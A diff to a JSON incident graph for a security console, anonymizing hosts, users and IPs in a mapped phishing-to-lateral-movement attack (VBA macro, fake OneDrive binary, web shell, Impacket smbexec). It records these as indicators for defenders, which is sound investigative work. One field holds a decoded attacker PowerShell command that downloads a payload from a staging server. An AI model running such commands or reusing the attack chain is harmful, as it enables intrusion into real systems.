@@ -1,19 +1,19 @@
 {
   "nodes": [
     {
-      "id": "host-ggubin",
+      "id": "host-alpha",
       "type": "host",
       "data": {
-        "label": "ggubin.qa-ptlab.ru",
+        "label": "ws-alpha.corp.example",
         "kind": "host",
         "system": "MaxPatrol",
         "severity": "critical",
         "isIoc": true,
-        "sourceUrl": "https://maxpatrol.qa-ptlab.ru/console/assets/ggubin.qa-ptlab.ru",
+        "sourceUrl": "https://maxpatrol.example/console/assets/ws-alpha.corp.example",
         "details": {
           "role": "Точка входа (фишинг)",
-          "account": "ggubin",
-          "ip": "10.125.10.44",
+          "account": "demo-user-a",
+          "ip": "192.0.2.44",
           "status": "online"
         }
       }
@@ -26,7 +26,7 @@
         "kind": "process",
         "system": "MaxPatrol",
         "severity": "info",
-        "sourceUrl": "https://maxpatrol.qa-ptlab.ru/console/events?host=ggubin.qa-ptlab.ru&process=explorer.exe"
+        "sourceUrl": "https://maxpatrol.example/console/events?host=ws-alpha.corp.example&process=explorer.exe"
       }
     },
     {
@@ -38,7 +38,7 @@
         "system": "MaxPatrol",
         "severity": "high",
         "isIoc": true,
-        "sourceUrl": "https://maxpatrol.qa-ptlab.ru/console/events?correlation=office_file_with_macros&host=ggubin.qa-ptlab.ru",
+        "sourceUrl": "https://maxpatrol.example/console/events?correlation=office_file_with_macros&host=ws-alpha.corp.example",
         "details": {
           "vector": "Фишинговое письмо",
           "contains": "VBA-макрос"
@@ -54,7 +54,7 @@
         "system": "MaxPatrol",
         "severity": "medium",
         "eventId": "1",
-        "sourceUrl": "https://maxpatrol.qa-ptlab.ru/console/events?msgid=1&host=ggubin.qa-ptlab.ru&process=winword.exe"
+        "sourceUrl": "https://maxpatrol.example/console/events?msgid=1&host=ws-alpha.corp.example&process=winword.exe"
       }
     },
     {
@@ -66,9 +66,9 @@
         "system": "MaxPatrol",
         "severity": "high",
         "eventId": "1",
-        "sourceUrl": "https://maxpatrol.qa-ptlab.ru/console/events?msgid=1&host=ggubin.qa-ptlab.ru&process=wscript.exe",
+        "sourceUrl": "https://maxpatrol.example/console/events?msgid=1&host=ws-alpha.corp.example&process=wscript.exe",
         "details": {
-          "cmdline": "C:\\WINDOWS\\System32\\WScript.exe \"C:\\Users\\OPetrova\\AppData\\Local\\Temp\\script.vbs\""
+          "cmdline": "C:\\WINDOWS\\System32\\WScript.exe \"C:\\Users\\DemoUser\\AppData\\Local\\Temp\\script.vbs\""
         }
       }
     },
@@ -81,9 +81,9 @@
         "system": "MaxPatrol",
         "severity": "high",
         "isIoc": true,
-        "sourceUrl": "https://maxpatrol.qa-ptlab.ru/console/events?correlation=malicious_office_document&host=ggubin.qa-ptlab.ru",
+        "sourceUrl": "https://maxpatrol.example/console/events?correlation=malicious_office_document&host=ws-alpha.corp.example",
         "details": {
-          "path": "C:\\Users\\OPetrova\\AppData\\Local\\Temp\\script.vbs"
+          "path": "C:\\Users\\DemoUser\\AppData\\Local\\Temp\\script.vbs"
         }
       }
     },
@@ -96,7 +96,7 @@
         "system": "MaxPatrol",
         "severity": "low",
         "isFalsePositive": true,
-        "sourceUrl": "https://maxpatrol.qa-ptlab.ru/console/events?correlation=lsass_memory_access&host=ggubin.qa-ptlab.ru",
+        "sourceUrl": "https://maxpatrol.example/console/events?correlation=lsass_memory_access&host=ws-alpha.corp.example",
         "details": {
           "verdict": "Легитимно: подтверждено подписью процесса и цепочкой запуска"
         }
@@ -110,7 +110,7 @@
         "kind": "process",
         "system": "MaxPatrol",
         "severity": "medium",
-        "sourceUrl": "https://maxpatrol.qa-ptlab.ru/console/events?host=ggubin.qa-ptlab.ru&process=cmd.exe"
+        "sourceUrl": "https://maxpatrol.example/console/events?host=ws-alpha.corp.example&process=cmd.exe"
       }
     },
     {
@@ -121,7 +121,7 @@
         "kind": "process",
         "system": "MaxPatrol",
         "severity": "high",
-        "sourceUrl": "https://maxpatrol.qa-ptlab.ru/console/events?correlation=download_file_through_curl&host=ggubin.qa-ptlab.ru",
+        "sourceUrl": "https://maxpatrol.example/console/events?correlation=download_file_through_curl&host=ws-alpha.corp.example",
         "details": {
           "note": "Скачивание по HTTP без шифрования"
         }
@@ -135,10 +135,10 @@
         "kind": "process",
         "system": "MaxPatrol",
         "severity": "critical",
-        "sourceUrl": "https://maxpatrol.qa-ptlab.ru/console/events?correlation=execute_malicious_powershell_cmdlet&host=ggubin.qa-ptlab.ru",
+        "sourceUrl": "https://maxpatrol.example/console/events?correlation=execute_malicious_powershell_cmdlet&host=ws-alpha.corp.example",
         "details": {
           "note": "Base64-encoded command, декодирована вручную",
-          "decoded": "Invoke-WebRequest -Uri http://10.125.11.90:8000/veeam_1272 -OutFile C:\\ProgramData\\v1272 -TimeoutSec 300"
+          "decoded": "Invoke-WebRequest -Uri http://198.51.100.90:8000/veeam_1272 -OutFile C:\\ProgramData\\v1272 -TimeoutSec 300"
         }
       }
     },
@@ -151,7 +151,7 @@
         "system": "PT Fusion",
         "severity": "critical",
         "isIoc": true,
-        "sourceUrl": "https://fusion.ptsecurity.com/hash/lookup?file=MicrosoftOneDrive.exe&host=ggubin.qa-ptlab.ru",
+        "sourceUrl": "https://fusion.ptsecurity.com/hash/lookup?file=MicrosoftOneDrive.exe&host=ws-alpha.corp.example",
         "details": {
           "path": "C:\\ProgramData\\MicrosoftOneDrive.exe",
           "signature": "отсутствует",
@@ -163,12 +163,12 @@
       "id": "external-host-stager",
       "type": "external-host",
       "data": {
-        "label": "10.125.11.90:8000",
+        "label": "198.51.100.90:8000",
         "kind": "external-host",
         "system": "PT NAD",
         "severity": "critical",
         "isIoc": true,
-        "sourceUrl": "https://nad.qa-ptlab.ru/network/hosts/10.125.11.90",
+        "sourceUrl": "https://nad.example/network/hosts/198.51.100.90",
         "details": {
           "role": "Staging-сервер атакующего"
         }
@@ -183,7 +183,7 @@
         "system": "PT NAD",
         "severity": "high",
         "isIoc": true,
-        "sourceUrl": "https://nad.qa-ptlab.ru/files?name=veeam_1272"
+        "sourceUrl": "https://nad.example/files?name=veeam_1272"
       }
     },
     {
@@ -195,7 +195,7 @@
         "system": "Sandbox",
         "severity": "critical",
         "isIoc": true,
-        "sourceUrl": "https://sandbox.qa-ptlab.ru/report/pilot-ps1"
+        "sourceUrl": "https://sandbox.example/report/pilot-ps1"
       }
     },
     {
@@ -207,7 +207,7 @@
         "system": "MaxPatrol",
         "severity": "critical",
         "eventId": "4698",
-        "sourceUrl": "https://maxpatrol.qa-ptlab.ru/console/events?msgid=4698&host=ggubin.qa-ptlab.ru",
+        "sourceUrl": "https://maxpatrol.example/console/events?msgid=4698&host=ws-alpha.corp.example",
         "details": {
           "note": "Механизм закрепления в системе"
         }
@@ -221,7 +221,7 @@
         "kind": "network-event",
         "system": "PT NAD",
         "severity": "medium",
-        "sourceUrl": "https://nad.qa-ptlab.ru/sessions?proto=http&src=ggubin.qa-ptlab.ru",
+        "sourceUrl": "https://nad.example/sessions?proto=http&src=ws-alpha.corp.example",
         "details": {
           "note": "Обнаружено через виджеты PT NAD вместо группировок"
         }
@@ -236,7 +236,7 @@
         "system": "PT NAD",
         "severity": "critical",
         "isIoc": true,
-        "sourceUrl": "https://nad.qa-ptlab.ru/files?name=shell.php",
+        "sourceUrl": "https://nad.example/files?name=shell.php",
         "details": {
           "note": "Веб-шелл, команды через GET-параметр"
         }
@@ -251,7 +251,7 @@
         "system": "PT NAD",
         "severity": "high",
         "isIoc": true,
-        "sourceUrl": "https://nad.qa-ptlab.ru/files?name=transfer.php"
+        "sourceUrl": "https://nad.example/files?name=transfer.php"
       }
     },
     {
@@ -262,7 +262,7 @@
         "kind": "correlation",
         "system": "Sandbox",
         "severity": "info",
-        "sourceUrl": "https://sandbox.qa-ptlab.ru/report/shell-transfer-php",
+        "sourceUrl": "https://sandbox.example/report/shell-transfer-php",
         "details": {
           "status": "Подтверждено вредоносное поведение"
         }
@@ -277,7 +277,7 @@
         "system": "MaxPatrol",
         "severity": "critical",
         "isIoc": true,
-        "sourceUrl": "https://maxpatrol.qa-ptlab.ru/console/correlations/impacket_smbexec",
+        "sourceUrl": "https://maxpatrol.example/console/correlations/impacket_smbexec",
         "details": {
           "note": "Редкая сработка — не используется админами компании"
         }
@@ -292,7 +292,7 @@
         "system": "MaxPatrol",
         "severity": "high",
         "eventId": "5145",
-        "sourceUrl": "https://maxpatrol.qa-ptlab.ru/console/events?msgid=5145&host=euskova.qa-ptlab.ru",
+        "sourceUrl": "https://maxpatrol.example/console/events?msgid=5145&host=ws-beta.corp.example",
         "details": {
           "note": "Удалённое создание службы через RPC"
         }
@@ -307,7 +307,7 @@
         "system": "MaxPatrol",
         "severity": "critical",
         "eventId": "4697 / 7045",
-        "sourceUrl": "https://maxpatrol.qa-ptlab.ru/console/events?msgid=4697,7045&host=euskova.qa-ptlab.ru",
+        "sourceUrl": "https://maxpatrol.example/console/events?msgid=4697,7045&host=ws-beta.corp.example",
         "details": {
           "parentProcessId": "0",
           "note": "Косвенный признак удалённого запуска"
@@ -315,18 +315,18 @@
       }
     },
     {
-      "id": "host-euskova",
+      "id": "host-beta",
       "type": "host",
       "data": {
-        "label": "euskova.qa-ptlab.ru",
+        "label": "ws-beta.corp.example",
         "kind": "host",
         "system": "MaxPatrol",
         "severity": "critical",
         "isIoc": true,
-        "sourceUrl": "https://maxpatrol.qa-ptlab.ru/console/assets/euskova.qa-ptlab.ru",
+        "sourceUrl": "https://maxpatrol.example/console/assets/ws-beta.corp.example",
         "details": {
           "role": "Цель латерального перемещения",
-          "ip": "10.125.10.62",
+          "ip": "192.0.2.62",
           "status": "offline"
         }
       }
@@ -339,7 +339,7 @@
         "kind": "response",
         "system": "MaxPatrol",
         "severity": "info",
-        "sourceUrl": "https://maxpatrol.qa-ptlab.ru/console/response",
+        "sourceUrl": "https://maxpatrol.example/console/response",
         "details": {
           "actions": "Блокировка сети, завершение процессов (в т.ч. дочерних), удаление файлов"
         }
@@ -349,7 +349,7 @@
   "edges": [
     {
       "id": "e-host-explorer",
-      "source": "host-ggubin",
+      "source": "host-alpha",
       "target": "process-explorer",
       "label": "хост",
       "data": {
@@ -520,7 +520,7 @@
     },
     {
       "id": "e-host-impacket",
-      "source": "host-ggubin",
+      "source": "host-alpha",
       "target": "correlation-impacket",
       "label": "источник атаки",
       "data": {
@@ -546,9 +546,9 @@
       }
     },
     {
-      "id": "e-service-euskova",
+      "id": "e-service-demo-user-b",
       "source": "event-service-created",
-      "target": "host-euskova",
+      "target": "host-beta",
       "label": "на узле",
       "data": {
         "kind": "created"
@@ -556,16 +556,16 @@
     },
     {
       "id": "e-lateral-movement",
-      "source": "host-ggubin",
-      "target": "host-euskova",
+      "source": "host-alpha",
+      "target": "host-beta",
       "label": "Impacket smbexec через RPC/svcctl",
       "data": {
         "kind": "lateral-movement"
       }
     },
     {
-      "id": "e-ggubin-response",
-      "source": "host-ggubin",
+      "id": "e-demo-user-a-response",
+      "source": "host-alpha",
       "target": "response-action",
       "label": "доступные действия",
       "data": {
@@ -573,8 +573,8 @@
       }
     },
     {
-      "id": "e-euskova-response",
-      "source": "host-euskova",
+      "id": "e-demo-user-b-response",
+      "source": "host-beta",
       "target": "response-action",
       "label": "доступные действия",
       "data": {
@@ -591,7 +591,7 @@
       "title": "Получено фишинговое письмо с malicious_office_document.docx",
       "severity": "high",
       "entity_ids": [
-        "host-ggubin",
+        "host-alpha",
         "file-office-doc"
       ]
     },
@@ -603,7 +603,7 @@
       "title": "Запуск winword.exe и выполнение VBA-макроса",
       "severity": "high",
       "entity_ids": [
-        "host-ggubin",
+        "host-alpha",
         "process-winword",
         "process-wscript"
       ]
@@ -616,7 +616,7 @@
       "title": "Чтение памяти lsass.exe (Подтверждено легитимным)",
       "severity": "low",
       "entity_ids": [
-        "host-ggubin",
+        "host-alpha",
         "event-lsass-access"
       ]
     },
@@ -628,7 +628,7 @@
       "title": "Интерпретатор cmd.exe запущен процессом wscript.exe",
       "severity": "medium",
       "entity_ids": [
-        "host-ggubin",
+        "host-alpha",
         "process-cmd"
       ]
     },
@@ -640,7 +640,7 @@
       "title": "curl.exe скачал неподписанный MicrosoftOneDrive.exe",
       "severity": "high",
       "entity_ids": [
-        "host-ggubin",
+        "host-alpha",
         "process-curl",
         "file-onedrive-fake"
       ]
@@ -650,10 +650,10 @@
       "source": "PT NAD",
       "event_class": "Malicious Connection",
       "event_ts": "2026-07-23T09:40:00.000Z",
-      "title": "Обращение powershell.exe к staging-серверу 10.125.11.90",
+      "title": "Обращение powershell.exe к staging-серверу 198.51.100.90",
       "severity": "critical",
       "entity_ids": [
-        "host-ggubin",
+        "host-alpha",
         "process-powershell",
         "external-host-stager"
       ]
@@ -666,7 +666,7 @@
       "title": "Обнаружено скачивание архива veeam_1272",
       "severity": "high",
       "entity_ids": [
-        "host-ggubin",
+        "host-alpha",
         "file-veeam-archive"
       ]
     },
@@ -678,7 +678,7 @@
       "title": "Создание вредоносной запланированной задачи (ID 4698)",
       "severity": "critical",
       "entity_ids": [
-        "host-ggubin",
+        "host-alpha",
         "persistence-task"
       ]
     },
@@ -690,7 +690,7 @@
       "title": "В незашифрованном HTTP обнаружена передача shell.php",
       "severity": "critical",
       "entity_ids": [
-        "host-ggubin",
+        "host-alpha",
         "file-shell-php",
         "network-http-download"
       ]
@@ -711,11 +711,11 @@
       "source": "MaxPatrol",
       "event_class": "Lateral Movement",
       "event_ts": "2026-07-23T11:20:00.000Z",
-      "title": "Доступ к именованному каналу svcctl на хосте euskova.qa-ptlab.ru",
+      "title": "Доступ к именованному каналу svcctl на хосте ws-beta.corp.example",
       "severity": "high",
       "entity_ids": [
-        "host-ggubin",
-        "host-euskova",
+        "host-alpha",
+        "host-beta",
         "event-5145"
       ]
     },
@@ -727,8 +727,8 @@
       "title": "Сработка правила корреляции impacket_smbexec",
       "severity": "critical",
       "entity_ids": [
-        "host-ggubin",
-        "host-euskova",
+        "host-alpha",
+        "host-beta",
         "correlation-impacket"
       ]
     },
@@ -740,7 +740,7 @@
       "title": "Удаленное создание службы на целевом хосте",
       "severity": "critical",
       "entity_ids": [
-        "host-euskova",
+        "host-beta",
         "event-service-created"
       ]
     }
